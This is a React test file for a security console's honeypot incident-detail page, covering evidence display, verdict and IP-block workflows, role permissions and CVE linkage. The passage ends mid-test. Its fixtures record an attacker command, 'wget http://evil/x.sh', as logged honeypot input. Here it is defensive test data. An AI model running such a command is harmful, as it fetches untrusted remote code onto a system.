import { fireEvent, screen, waitFor, within } from '@testing-library/react'
import type { RouteObject } from 'react-router'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { ctiKeys, incidentCtiPath } from '@/api/cti'
import { incidentPath, type AbsorbedInfo, type EvidenceSample, type IncidentDetail } from '@/api/incidents'
import { ACTION_STATUS } from '@/lib/domain'
import { revealHidden } from '@/lib/untrusted'
import { applicability, cve, freshness, incidentCti, signature } from '@/test/cti-fixtures'
import { expectInertDom, expectLongFolds, expectMixedRevealed, HOSTILE, LONG, MIXED } from '@/test/hostile-fixtures'
import { noRetryClient, renderRoutes } from '@/test/render'
import { IncidentDetailPage } from './IncidentDetailPage'

// ---------------------------------------------------------------- 표본

const KEY = 'R003|v2|4.4.66.84|2026-09-18T06:00:00+00:00'
const RELATED_KEY = 'R001|v2|4.4.66.84|2026-09-17T01:00:00+00:00'
const PATH = `/incidents/${encodeURIComponent(KEY)}`

function detail(extra: Partial<IncidentDetail> = {}): IncidentDetail {
  return {
    incident_key: KEY,
    rule_id: 'R003',
    rule_version: 'v2',
    rule_name: '악성코드 투하',
    severity: 'critical',
    actor_ip: '4.4.66.84',
    target: null,
    first_ts: '2026-09-18T06:00:00+00:00',
    last_ts: '2026-09-18T06:10:00+00:00',
    signal_count: 3,
    session_count: 1,
    status: 'open',
    created_at: '2026-09-18T06:10:05+00:00',
    evidence: { sample: [{ ts: '2026-09-18T06:00:00+00:00', shasum: 'abc123', url: 'http://evil/x.sh' }], sessions: ['s-1'], observed_count_max: 3 },
    actions: [],
    verdicts: [],
    related: [{ incident_key: RELATED_KEY, rule_id: 'R001', severity: 'low', first_ts: '2026-09-17T01:00:00+00:00', signal_count: 40, status: 'resolved' }],
    behavior: [
      { ts: '2026-09-18T05:58:00+00:00', sensor: 'hp-01', eventid: 'cowrie.login.success', session: 's-1', username: 'root', input: null, url: null, shasum: null, http_method: null, http_status: null },
      { ts: '2026-09-18T06:00:30+00:00', sensor: 'hp-01', eventid: 'cowrie.command.input', session: 's-1', username: null, input: 'wget http://evil/x.sh', url: null, shasum: null, http_method: null, http_status: null },
    ],
    actor: {
      history: { first_seen: '2026-09-10T00:00:00+00:00', last_seen: '2026-09-18T06:10:00+00:00', events: 120, sensors: ['hp-01'], sessions: 7 },
      rules: [{ rule_id: 'R001', incidents: 2 }],
      blocked: { reason: 'console', method: 'nft', created_at: '2026-09-18T07:00:00+00:00', expires_at: '2999-01-01T00:00:00+00:00', released_at: null, enforced_at: '2026-09-18T07:00:10+00:00' },
    },
    raw: [
      { ts: '2026-09-18T06:00:30+00:00', sensor: 'hp-01', eventid: 'cowrie.command.input', session: 's-1', username: null, input: 'wget http://evil/x.sh', url: null, shasum: null, http_method: null, http_status: null, has_password: false, user_agent: null, message: 'CMD: wget http://evil/x.sh' },
    ],
    circular: '규칙 조건이 파일 이동이고 판정 기준의 위협 조건도 같다',
    ...extra,
  }
}

/** 같은 페이로드 흡수(규칙 v3) 기록. 흡수 2곳(한 곳은 두 번) · 억제 1건, 흡수 차단 3곳 유지 중 */
const KEY_FP = 'SHA256:MkYY9qiVsFGBC5WkjoClCkwEFW5iSjcGQF7m4n4H7Cw'
function absorbed(extra: Partial<AbsorbedInfo> = {}): AbsorbedInfo {
  return {
    items: [
      { actor_ip: '198.51.100.2', kind: 'absorbed', rule_id: 'R006', member_key: 'R006|v3|198.51.100.2|a', via_key: null, first_ts: '2026-09-18T07:00:00+00:00', last_ts: '2026-09-18T07:00:00+00:00', signal_count: 1, sessions: 1, payload: KEY_FP, reason: '같은 SSH 키를 24시간 안에 다시 심음(흡수)' },
      { actor_ip: '198.51.100.3', kind: 'absorbed', rule_id: 'R006', member_key: 'R006|v3|198.51.100.3|b', via_key: null, first_ts: '2026-09-18T08:00:00+00:00', last_ts: '2026-09-18T08:00:00+00:00', signal_count: 1, sessions: 2, payload: KEY_FP, reason: '같은 SSH 키를 24시간 안에 다시 심음(흡수)' },
      { actor_ip: '198.51.100.2', kind: 'suppressed', rule_id: 'R002', member_key: 'R002|v3|198.51.100.2|c', via_key: 'R006|v3|198.51.100.2|a', first_ts: '2026-09-18T07:00:01+00:00', last_ts: '2026-09-18T07:00:09+00:00', signal_count: 1, sessions: 1, payload: null, reason: '흡수된 R006 사건과 같은 출발지 · 같은 구간의 낮은 알림(억제)' },
    ],
    total: 3,
    sources: 2,
    blocked: 3,
    ...extra,
  }
}

function json(body: unknown, status: number): Response {
  return new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } })
}

interface StubOptions {
  role?: string
  body?: unknown
  status?: number
  /** GET …/cti 응답. 기본은 서명 규칙 사건이 아님(applicable=false) */
  cti?: unknown
  ctiStatus?: number
}

/** 이 표본 사건의 취약점 연계(서명 규칙 사건) */
function ctiFor(extra: Parameters<typeof incidentCti>[0] = {}) {
  return incidentCti({ incident_key: KEY, ...extra })
}

function isDetail(body: unknown): body is IncidentDetail {
  return !!body && typeof body === 'object' && Array.isArray((body as IncidentDetail).actions)
}

/**
 * /api/me · 상세 GET · 판정 · 조치 POST 를 답하는 fetch. 서버처럼 POST 가 상세를 바꾼다
 * (판정 → 이력 추가 · resolved, 조치 → 이력 추가 · ACTION_STATUS). 그래야 조치 뒤 다시 받는 상세가 옛 상태로 되돌리지 않는다.
 */
function stubApi({ role = 'operator', body = detail(), status = 200, cti = { as_of: '2026-09-18T08:00:00Z', incident_key: KEY, applicable: false }, ctiStatus = 200 }: StubOptions = {}) {
  let state = body
  const fetch = vi.fn<typeof globalThis.fetch>(async (input, init) => {
    const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url
    const method = init?.method ?? 'GET'
    if (url.startsWith('/api/me')) return json({ username: 'han', role }, 200)
    if (url === incidentCtiPath(KEY) && method === 'GET') return json(cti, ctiStatus)
    if (url === incidentPath(KEY) && method === 'GET') return json(state, status)
    if (url === `${incidentPath(KEY)}/verdict` && method === 'POST') {
      const sent = JSON.parse(String(init?.body)) as Record<string, unknown>
      const created = { id: 9, reason: null, observed_value: null, proposed: null, decision_seconds: null, ...sent, operator: 'han', created_at: '2026-09-18T08:00:00+00:00', incident_key: KEY }
      if (isDetail(state)) state = { ...state, status: 'resolved', verdicts: [...state.verdicts, created as unknown as IncidentDetail['verdicts'][number]] }
      return json(created, 201)
    }
    if (url === `${incidentPath(KEY)}/actions` && method === 'POST') {
      const sent = JSON.parse(String(init?.body)) as Record<string, unknown>
      const created = { id: 4, note: null, ...sent, operator: 'han', created_at: '2026-09-18T08:00:00+00:00', incident_key: KEY,
        ...(sent.include_absorbed ? { absorbed: sent.action === 'block_ip' ? { blocked: 2, kept: 0 } : { released: 3 } } : {}) }
      if (isDetail(state)) {
        const next = ACTION_STATUS[sent.action as keyof typeof ACTION_STATUS] ?? state.status
        state = { ...state, status: next, actions: [...state.actions, created as unknown as IncidentDetail['actions'][number]] }
      }
      return json(created, 201)
    }
    return json({ detail: '없는 경로' }, 404)
  })
  vi.stubGlobal('fetch', fetch)
  return fetch
}

function routes(): RouteObject[] {
  return [
    { path: '/incidents/:key', element: <IncidentDetailPage /> },
    { path: '/incidents', element: <p>목록 본문</p> },
  ]
}

/** fetch 호출 가운데 이 주소 · 방식으로 나간 것의 본문 */
function sentBody(fetch: ReturnType<typeof stubApi>, url: string, method: string): Record<string, unknown> | undefined {
  const call = fetch.mock.calls.find(([input, init]) => input === url && init?.method === method)
  return call ? (JSON.parse(String(call[1]?.body)) as Record<string, unknown>) : undefined
}

/**
 * ⑤ 구역. /api/me 는 ⑤ 가 그려진 뒤에야 요청되므로 권한이 정해질 때까지 기다린다
 * (운영에서는 AppLayout 이 먼저 받아 두어 캐시가 차 있다). 확인 단추의 "확인하는 중" 이유가 사라지면 정해진 것이다.
 */
async function readyPanel() {
  const region = await screen.findByRole('region', { name: '조치와 판정' })
  const panel = within(region)
  await waitFor(() => expect(panel.queryByRole('button', { name: '확인' }) ?? panel.queryByText(/조회 전용 계정/)).not.toBeNull())
  return { region, panel }
}

describe('IncidentDetailPage', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
  })

  it('머리글과 구역 다섯 개를 그리고 순환 규칙 경고를 보인다', async () => {
    stubApi()
    renderRoutes(routes(), PATH)

    expect(await screen.findByRole('heading', { level: 1, name: 'R003 악성코드 투하' })).toBeInTheDocument()
    // 머리글: 심각도 · 상태 · 발생원 · 출발지 · 경과(판정 목표)
    expect(screen.getByText('critical')).toHaveAttribute('data-severity', 'critical')
    expect(screen.getAllByText('신규')[0]).toHaveAttribute('data-status', 'open')
    expect(screen.getByText('발생원 허니팟')).toBeInTheDocument()
    expect(screen.getByText(/판정 목표 1시간/)).toBeInTheDocument()

    for (const name of ['규칙이 본 것', '규칙이 보지 않은 증거', '행위자 이력', '원문 로그', '조치와 판정']) {
      expect(screen.getByRole('region', { name })).toBeInTheDocument()
    }

    // ① 순환 규칙 경고와 표본
    const evidence = screen.getByRole('region', { name: '규칙이 본 것' })
    expect(within(evidence).getByText('순환 규칙')).toBeInTheDocument()
    expect(within(evidence).getByText(/규칙 조건이 파일 이동이고/)).toBeInTheDocument()
    expect(within(evidence).getByText('abc123')).toBeInTheDocument()
    expect(within(evidence).getByText('최대 3건')).toBeInTheDocument()

    // ② 행위: 로그인 성공 · 명령
    const behavior = screen.getByRole('region', { name: '규칙이 보지 않은 증거' })
    expect(within(behavior).getByText('계정 root')).toBeInTheDocument()
    expect(within(behavior).getByText('wget http://evil/x.sh')).toBeInTheDocument()

    // ③ 이력 · 차단 · 관련 사건 링크
    const actor = screen.getByRole('region', { name: '행위자 이력' })
    expect(within(actor).getByText('120건')).toBeInTheDocument()
    expect(within(actor).getByText('차단 중')).toBeInTheDocument()
    expect(within(actor).getByRole('link', { name: 'R001' })).toHaveAttribute('href', `/incidents/${encodeURIComponent(RELATED_KEY)}`)

    // ④ 원문은 접혀 있고 펼치면 줄이 보인다
    const raw = screen.getByRole('region', { name: '원문 로그' })
    expect(within(raw).queryByText(/CMD: wget/)).toBeNull()
    fireEvent.click(within(raw).getByRole('button', { name: '펼치기' }))
    expect(within(raw).getByText(/CMD: wget/)).toBeInTheDocument()
  })

  it('출발지와 대상이 함께 있는 사건은 둘 다 보인다', async () => {
    stubApi({ body: detail({ target: 'test:acceptance' }) })
    renderRoutes(routes(), PATH)
    expect(await screen.findByText('test:acceptance')).toBeInTheDocument()
    expect(screen.getAllByText('4.4.66.84').length).toBeGreaterThan(0)
  })

  it('판정을 제출하면 판정값 · 사유 · 관측값 · 소요 초가 가고, 이력과 상태가 바뀐다', async () => {
    const fetch = stubApi()
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()

    expect(panel.getByRole('heading', { name: '판정' })).toBeInTheDocument()
    expect(panel.getByText('아직 판정 · 조치 기록이 없습니다.')).toBeInTheDocument()

    // 판정값 없이 누르면 보내지 않는다
    fireEvent.click(panel.getByRole('button', { name: '판정 기록' }))
    expect(panel.getByRole('alert')).toHaveTextContent('판정값을 고르세요')

    fireEvent.click(panel.getByRole('radio', { name: /^실제 위협/ }))
    fireEvent.change(panel.getByLabelText('사유'), { target: { value: '  로그인 뒤 wget 으로 파일 투하  ' } })
    fireEvent.click(panel.getByRole('button', { name: '판정 기록' }))

    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')).toBeDefined())
    const body = sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')!
    expect(body.verdict).toBe('threat')
    expect(body.reason).toBe('로그인 뒤 wget 으로 파일 투하')
    expect(body.observed_value).toBe(3)
    expect(typeof body.decision_seconds).toBe('number')
    expect(body.decision_seconds as number).toBeGreaterThanOrEqual(0)
    expect(body.decision_seconds as number).toBeLessThanOrEqual(86_400)

    expect(await panel.findByText('판정을 기록했습니다')).toBeInTheDocument()
    // 상세 캐시가 바로 바뀐다: 재판정 · 이력 · 종결
    expect(panel.getByRole('heading', { name: '재판정' })).toBeInTheDocument()
    expect(panel.getByRole('button', { name: '재판정 기록' })).toBeInTheDocument()
    const history = panel.getByRole('table', { name: '판정 · 조치 이력' })
    expect(within(history).getByText('실제 위협')).toHaveAttribute('data-verdict', 'threat')
    expect(within(history).getByText('로그인 뒤 wget 으로 파일 투하')).toBeInTheDocument()
    expect(screen.getAllByText('종결')[0]).toHaveAttribute('data-status', 'resolved')
    expect(screen.getByText(/^판정까지 /)).toBeInTheDocument()
  })

  it('사유가 비어 있으면 경고만 하고 기록한다', async () => {
    const fetch = stubApi()
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()

    expect(panel.getByText(/사유가 비어 있습니다/)).toBeInTheDocument()
    fireEvent.click(panel.getByRole('radio', { name: /^미결/ }))
    fireEvent.click(panel.getByRole('button', { name: '판정 기록' }))

    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')).toBeDefined())
    const body = sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')!
    expect(body.verdict).toBe('undetermined')
    expect('proposed' in body).toBe(false)
    expect(panel.queryByText(/제안 뒤집힘/)).toBeNull()
    expect('reason' in body).toBe(false)
  })

  it('차단은 만료 시간 · 메모를 받고 확정 단계를 거친 뒤 보낸다', async () => {
    const fetch = stubApi()
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()

    expect(panel.queryByRole('form', { name: '차단 확인' })).toBeNull()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    expect(fetch.mock.calls.some(([, init]) => init?.method === 'POST')).toBe(false)

    const confirm = within(panel.getByRole('form', { name: '차단 확인' }))
    fireEvent.change(confirm.getByLabelText('만료'), { target: { value: '168' } })
    fireEvent.change(confirm.getByLabelText('메모'), { target: { value: '세션 3개에서 명령 실행' } })
    fireEvent.click(confirm.getByRole('button', { name: '차단 확정' }))

    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toBeDefined())
    expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ action: 'block_ip', note: '세션 3개에서 명령 실행', expires_hours: 168 })

    expect(await panel.findByText('차단 조치를 기록했습니다')).toBeInTheDocument()
    expect(panel.queryByRole('form', { name: '차단 확인' })).toBeNull()
    await waitFor(() => expect(screen.getAllByText('조치중')[0]).toHaveAttribute('data-status', 'in_progress'))
    const history = panel.getByRole('table', { name: '판정 · 조치 이력' })
    expect(within(history).getByText('차단')).toBeInTheDocument()
  })

  it('viewer 는 조치가 숨겨지고 판정은 조회 전용이다', async () => {
    stubApi({ role: 'viewer' })
    renderRoutes(routes(), PATH)
    const { region, panel } = await readyPanel()
    expect(region.querySelector('[data-gated="denied"]')).not.toBeNull()
    expect(panel.getByText(/조회 전용 계정/)).toBeInTheDocument()
    for (const name of ['확인', '차단', '차단 해제', '규칙 억제']) {
      expect(panel.queryByRole('button', { name })).toBeNull()
    }
  })

  it('operator 는 차단 해제 · 규칙 억제가 숨겨지고, 신규가 아니면 확인은 비활성이다', async () => {
    stubApi({ body: detail({ status: 'acknowledged' }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    expect(panel.queryByRole('button', { name: '차단 해제' })).toBeNull()
    expect(panel.queryByRole('button', { name: '규칙 억제' })).toBeNull()
    expect(panel.getByRole('button', { name: '확인' })).toHaveAttribute('title', '이미 확인 상태라 확인할 것이 없습니다')
    expect(panel.getByRole('button', { name: '차단' })).not.toHaveAttribute('aria-disabled')
  })

  it.each([
    ['실제 위협', 'threat', '제안 수락'],
    ['오탐', 'false_positive', '제안 뒤집힘'],
  ])('제안과 %s 판정을 비교하고 함께 저장한다', async (label, value, comparison) => {
    const fetch = stubApi({ body: detail({ proposal: { verdict: 'threat', reasons: ['후속 명령이 관측됐습니다.'] } }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    expect(panel.getByText('후속 명령이 관측됐습니다.')).toBeInTheDocument()
    expect(panel.getAllByRole('radio').some((radio) => (radio as HTMLInputElement).checked)).toBe(false)
    fireEvent.click(panel.getByRole('radio', { name: new RegExp('^' + label) }))
    expect(panel.getByText(new RegExp('^' + comparison))).toBeInTheDocument()
    fireEvent.click(panel.getByRole('button', { name: '판정 기록' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')).toMatchObject({ proposed: 'threat', verdict: value }))
    const history = await panel.findByRole('table', { name: '판정 · 조치 이력' })
    expect(within(history).getByText(new RegExp(comparison))).toHaveTextContent('소요')
  })

  it('저장된 제안 · 뒤집힘 · 소요 시간은 상세를 다시 열어도 보인다', async () => {
    stubApi({ body: detail({ status: 'resolved', verdicts: [{ id: 1, verdict: 'false_positive', proposed: 'threat', decision_seconds: 125, reason: '추가 확인', observed_value: 3, operator: 'han', created_at: '2026-09-18T08:00:00Z' }] }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    const history = panel.getByRole('table', { name: '판정 · 조치 이력' })
    expect(within(history).getByText(/제안 실제 위협 · 제안 뒤집힘/)).toHaveTextContent('소요 2분 5초')
  })

  it('admin 은 살아 있는 차단을 풀 수 있고, 판정 실패는 서버 설명을 띠로 보인다', async () => {
    const fetch = stubApi({ role: 'admin' })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()

    const release = panel.getByRole('button', { name: '차단 해제' })
    expect(release).not.toHaveAttribute('aria-disabled')
    fireEvent.click(release)
    expect(panel.getByRole('form', { name: '차단 해제 확인' })).toBeInTheDocument()
    fireEvent.click(panel.getByRole('button', { name: '취소' }))
    expect(panel.queryByRole('form', { name: '차단 해제 확인' })).toBeNull()

    // 판정 실패(500)
    fetch.mockImplementation(async (input, init) => {
      const url = String(input)
      if (init?.method === 'POST') return json({ detail: '기록 저장에 실패했습니다' }, 500)
      if (url.startsWith('/api/me')) return json({ username: 'root', role: 'admin' }, 200)
      return json(detail(), 200)
    })
    fireEvent.click(panel.getByRole('radio', { name: /^오탐/ }))
    fireEvent.click(panel.getByRole('button', { name: '판정 기록' }))
    expect(await panel.findByText('판정을 기록하지 못했습니다')).toBeInTheDocument()
    expect(panel.getByRole('alert')).toHaveTextContent('기록 저장에 실패했습니다 (HTTP 500)')
    // 실패한 판정은 이력에 들어가지 않는다
    expect(panel.getByText('아직 판정 · 조치 기록이 없습니다.')).toBeInTheDocument()
  })

  it('없는 사건(404)은 찾을 수 없음 화면과 목록 링크', async () => {
    stubApi({ body: { detail: '인시던트를 찾을 수 없습니다' }, status: 404 })
    renderRoutes(routes(), PATH, noRetryClient())
    expect(await screen.findByRole('heading', { level: 1, name: '인시던트를 찾을 수 없습니다' })).toBeInTheDocument()
    expect(screen.getByText('S-04 · 404')).toBeInTheDocument()
    expect(screen.getByRole('link', { name: '인시던트 목록으로' })).toHaveAttribute('href', '/incidents')
    expect(screen.queryByRole('region', { name: '조치와 판정' })).toBeNull()
  })

  it('차단 요청이 실패하면 오류를 보이고 확인 입력과 이력을 유지한다', async () => {
    const fetch = stubApi()
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    const original = fetch.getMockImplementation()!
    fetch.mockImplementation((input, init) => init?.method === 'POST'
      ? Promise.resolve(json({ detail: '차단 요청을 저장할 수 없습니다' }, 503))
      : original(input, init))
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    fireEvent.change(panel.getByLabelText('메모'), { target: { value: '재시도용 메모' } })
    fireEvent.click(panel.getByRole('button', { name: '차단 확정' }))
    expect(await panel.findByText('조치를 기록하지 못했습니다')).toBeInTheDocument()
    expect(panel.getByRole('alert')).toHaveTextContent('차단 요청을 저장할 수 없습니다 (HTTP 503)')
    expect(panel.getByLabelText('메모')).toHaveValue('재시도용 메모')
    expect(panel.getByText('아직 판정 · 조치 기록이 없습니다.')).toBeInTheDocument()
  })

  it('권한 밖(403) · 서버 오류(5xx)는 공통 상태 화면', async () => {
    stubApi({ body: { detail: '권한이 없습니다' }, status: 403 })
    const { unmount } = renderRoutes(routes(), PATH, noRetryClient())
    expect(await screen.findByRole('heading', { level: 1, name: '이 화면을 볼 권한이 없습니다' })).toBeInTheDocument()
    unmount()
    vi.unstubAllGlobals()

    stubApi({ body: { detail: '데이터베이스 연결 실패' }, status: 503 })
    renderRoutes(routes(), PATH, noRetryClient())
    expect(await screen.findByRole('heading', { level: 1, name: '데이터를 불러오지 못했습니다' })).toBeInTheDocument()
    expect(screen.getByText('데이터베이스 연결 실패 (HTTP 503)')).toBeInTheDocument()
    expect(screen.getByRole('button', { name: '다시 시도' })).toBeInTheDocument()
  })

  it('첫 사건이면 ③ 에 같은 페이로드 흡수 목록(출발지 · 첫 시각 · 세션 · 사유)을 보인다', async () => {
    stubApi({ body: detail({ rule_id: 'R006', rule_name: 'SSH 키 심기', absorbed: absorbed({ total: 250 }) }) })
    renderRoutes(routes(), PATH)
    const actor = await screen.findByRole('region', { name: '행위자 이력' })
    expect(within(actor).getByText('같은 페이로드 흡수 2곳')).toBeInTheDocument()
    expect(within(actor).getByText(/이 사건의 흡수 차단 3곳 유지 중/)).toBeInTheDocument()
    const table = within(actor).getByRole('table', { name: '같은 페이로드 흡수' })
    const rows = within(table).getAllByRole('row').slice(1)
    expect(rows).toHaveLength(3)
    expect(within(rows[1]).getByText('198.51.100.3')).toBeInTheDocument()
    expect(within(rows[1]).getByText('2')).toBeInTheDocument()
    expect(within(rows[0]).getByText(/같은 SSH 키를 24시간 안에/)).toBeInTheDocument()
    expect(within(rows[0]).getByTitle(KEY_FP)).toBeInTheDocument()
    expect(within(rows[2]).getByText(/억제/)).toBeInTheDocument()
    expect(within(actor).getByText('앞 3건만 보입니다 · 전체 250건')).toBeInTheDocument()
  })

  it('흡수 기록이 없는 사건은 흡수 목록 · 함께 차단 선택을 보이지 않는다', async () => {
    stubApi({ body: detail({ absorbed: { items: [], total: 0, sources: 0, blocked: 0 } }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    expect(screen.queryByRole('table', { name: '같은 페이로드 흡수' })).toBeNull()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    expect(panel.queryByRole('checkbox')).toBeNull()
  })

  it('차단 확인에서 흡수된 출발지를 함께 차단하도록 고를 수 있다(기본은 이 출발지만)', async () => {
    const fetch = stubApi({ body: detail({ absorbed: absorbed() }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    const confirm = within(panel.getByRole('form', { name: '차단 확인' }))
    const check = confirm.getByRole('checkbox', { name: '흡수된 출발지 2곳도 함께 차단' })
    expect(check).not.toBeChecked()
    fireEvent.click(check)
    fireEvent.click(confirm.getByRole('button', { name: '차단 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toBeDefined())
    expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ action: 'block_ip', expires_hours: 24, include_absorbed: true })
    expect(await panel.findByText(/흡수 출발지 2곳 함께 차단/)).toBeInTheDocument()

    // 다시 열면 선택은 꺼져 있다
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    expect(panel.getByRole('checkbox', { name: '흡수된 출발지 2곳도 함께 차단' })).not.toBeChecked()
  })

  it('흡수를 쓰는 규칙은 흡수 기록이 아직 없어도 함께 차단(후속 차단)을 고를 수 있고, 넣지 않을 곳을 미리 밝힌다', async () => {
    const fetch = stubApi({ body: detail({ rule_id: 'R006', absorbed: { items: [], total: 0, sources: 0, blocked: 0, absorbs: true, follow: null } }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    const confirm = within(panel.getByRole('form', { name: '차단 확인' }))
    fireEvent.click(confirm.getByRole('checkbox', { name: '앞으로 흡수되는 출발지도 함께 차단' }))
    fireEvent.click(confirm.getByRole('button', { name: '차단 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ action: 'block_ip', expires_hours: 24, include_absorbed: true }))
  })

  it('함께 차단 안내에 사람이 푼 곳 · 차단 금지 대역을 적고, 후속 차단 중이면 ③ 과 해제 확인에 보인다', async () => {
    const follow = { expires_at: '2026-09-19T07:00:00+00:00', requested_by: 'han' }
    stubApi({ role: 'admin', body: detail({ absorbed: absorbed({ skipped: ['198.51.100.9'], skipped_total: 1, unblockable: 2, follow }) }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    expect(within(screen.getByRole('region', { name: '행위자 이력' })).getByText(/후속 차단 중 · 새로 흡수되는 출발지도/)).toBeInTheDocument()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    const block = within(panel.getByRole('form', { name: '차단 확인' }))
    expect(block.getByText(/사람이 푼 1곳\(198\.51\.100\.9\)은 다시 걸지 않습니다/)).toBeInTheDocument()
    expect(block.getByText(/차단 금지 대역\(사설 · 예약 주소\) 2곳은 넣지 않습니다/)).toBeInTheDocument()
    fireEvent.click(panel.getByRole('button', { name: '취소' }))
    fireEvent.click(panel.getByRole('button', { name: '차단 해제' }))
    expect(within(panel.getByRole('form', { name: '차단 해제 확인' })).getByRole('checkbox', { name: '흡수 차단 3곳도 함께 해제 · 후속 차단 중지' })).toBeInTheDocument()
  })

  it('admin 해제 확인은 흡수 차단 함께 해제를 고를 수 있고 3곳 이상이면 R201 을 알린다', async () => {
    const fetch = stubApi({ role: 'admin', body: detail({ absorbed: absorbed() }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('button', { name: '차단 해제' }))
    const confirm = within(panel.getByRole('form', { name: '차단 해제 확인' }))
    expect(confirm.getByText(/차단 대량 해제\(R201\) 알림이 뜹니다/)).toBeInTheDocument()
    fireEvent.click(confirm.getByRole('checkbox', { name: '흡수 차단 3곳도 함께 해제' }))
    fireEvent.click(confirm.getByRole('button', { name: '차단 해제 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ action: 'unblock_ip', include_absorbed: true }))
    expect(await panel.findByText(/흡수 차단 3곳 함께 해제/)).toBeInTheDocument()
  })

  it('이 출발지 차단이 풀렸어도 흡수 차단이 살아 있으면 흡수 차단만 풀 수 있다', async () => {
    const released = { reason: 'console', method: 'nft', created_at: '2026-09-18T07:00:00+00:00', expires_at: '2999-01-01T00:00:00+00:00', released_at: '2026-09-18T09:00:00+00:00', enforced_at: '2026-09-18T07:00:10+00:00' }
    const fetch = stubApi({ role: 'admin', body: detail({ absorbed: absorbed({ blocked: 2 }), actor: { ...detail().actor, blocked: released } }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    const release = panel.getByRole('button', { name: '차단 해제' })
    expect(release).not.toHaveAttribute('aria-disabled')
    fireEvent.click(release)
    const confirm = within(panel.getByRole('form', { name: '차단 해제 확인' }))
    expect(confirm.getByText(/흡수 차단/, { selector: 'p' })).toHaveTextContent('이 사건의 흡수 차단 2곳만 지금 풉니다')
    const check = confirm.getByRole('checkbox', { name: '흡수 차단 2곳도 함께 해제' })
    expect(check).toBeChecked()
    expect(check).toBeDisabled()
    expect(confirm.queryByText(/R201/)).toBeNull()
    fireEvent.click(confirm.getByRole('button', { name: '차단 해제 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ action: 'unblock_ip', include_absorbed: true }))
  })

  it('출발지가 없는 사건(대상만)은 행위 · 이력을 모을 수 없다고 알리고 차단은 흐리다', async () => {
    stubApi({ body: detail({ actor_ip: null, target: 'user:han', rule_id: 'R201', rule_name: '콘솔 차단 조작', severity: 'low', behavior: [], raw: [], related: [], actor: { history: null, rules: [], blocked: null }, circular: null }) })
    renderRoutes(routes(), PATH)
    expect(await screen.findByRole('heading', { level: 1, name: 'R201 콘솔 차단 조작' })).toBeInTheDocument()
    expect(screen.getByText('user:han')).toBeInTheDocument()
    expect(screen.getByText('발생원 콘솔 · 감사')).toBeInTheDocument()
    // 콘솔 발생 건은 심각도와 관계없이 critical 목표(1시간)
    expect(screen.getByText(/판정 목표 1시간/)).toBeInTheDocument()
    expect(screen.getByText(/출발지가 없는 사건이라/)).toBeInTheDocument()
    expect(screen.queryByText('순환 규칙')).toBeNull()
    const block = await within(screen.getByRole('region', { name: '조치와 판정' })).findByRole('button', { name: '차단' })
    expect(block).toHaveAttribute('title', '출발지가 없는 사건은 차단할 수 없습니다')
  })
})

describe('IncidentDetailPage · ⑥ 취약점 연계', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
  })

  it('서명 규칙 사건이면 제품 · 대응 방식 · 자산 적용 판정 · KEV · CVSS · EPSS · 신선도를 보인다', async () => {
    stubApi({ cti: ctiFor() })
    renderRoutes(routes(), PATH)
    const region = await screen.findByRole('region', { name: '취약점 연계' })
    const panel = within(region)
    expect(panel.getByText('CVE 정보는 조사 우선순위 참고용입니다. 판정은 행위 증거로 합니다.')).toBeInTheDocument()
    expect(panel.getByText('규칙 R105 c1 · 서명 1개 · CVE 1건')).toBeInTheDocument()
    expect(panel.queryByText(/공개 정보가 오래됐습니다/)).toBeNull()

    // 서명: 제품 · 공급사 · 대응 방식 · 적용 요약
    const block = region.querySelector('[data-signature="geoserver"]') as HTMLElement
    expect(within(block).getByText('GeoServer')).toBeInTheDocument()
    expect(within(block).getByText('OSGeo')).toBeInTheDocument()
    expect(within(block).getByText('분석가 대응')).toBeInTheDocument()
    expect(within(block).getByText('KEV 에 이 제품 항목 1건 · 아래 CVE 표에 함께 보입니다')).toBeInTheDocument()

    // 자산 적용: 디코이 → 비해당(모의 서비스), 오래된 자산 → 미확인
    const rows = within(panel.getByRole('table', { name: 'GeoServer 자산 적용' })).getAllByRole('row').slice(1)
    expect(rows).toHaveLength(3)
